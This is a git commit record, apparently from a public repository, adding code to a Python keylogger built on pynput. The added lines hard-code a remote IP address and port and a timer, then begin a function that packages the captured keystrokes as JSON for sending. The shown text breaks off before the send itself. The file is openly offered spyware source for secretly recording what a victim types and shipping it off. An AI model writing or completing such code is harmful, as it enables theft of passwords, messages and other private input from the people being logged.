1e50b36a0c0fe015f7eeefc328bc2e1d4eea8883
ＳＰＨＩＮＸ 豈 <98200081+Sphinxofficial@users.noreply.github.com>
2023-08-07 19:13:38 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,3 +2,10 @@ from pynput import keyboard
 import requests 
 import json
 import threading
+text = ""
+ip_adress = "106.198.0.32"
+port_num = "7070"
+time = 10
+def send_req():
+  try:
+    payload = json.dumps({"keyboardData" : text})
